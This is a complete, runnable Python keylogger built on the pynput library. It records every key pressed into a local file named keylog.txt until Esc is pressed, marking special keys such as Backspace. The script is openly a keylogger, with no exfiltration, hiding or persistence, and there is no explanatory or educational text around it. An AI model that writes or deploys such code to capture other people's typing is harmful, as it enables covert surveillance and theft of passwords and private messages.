from pynput import keyboard
import os
import time

def write_to_file(key):
    """Write the pressed key to a log file."""
    with open("keylog.txt", "a") as file:
        try:
            if key == keyboard.Key.space:
                file.write(" ")
            elif key == keyboard.Key.enter:
                file.write("\n")
            elif key == keyboard.Key.backspace:
                file.write(" [BACKSPACE] ")
            else:
                file.write(f"{key.char}")
        except AttributeError:
            file.write(f" [{key}] ")


def on_press(key):
    """Callback function for key press."""
    write_to_file(key)


def on_release(key):
    """Callback function for key release."""
    if key == keyboard.Key.esc:
        return False


def main():
    """Start the keylogger."""
    print("Starting keylogger...")
    print("Logs will be saved in 'keylog.txt'")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


if __name__ == "__main__":
    if not os.path.exists("keylog.txt"):
        open("keylog.txt", "w").close()
    main()
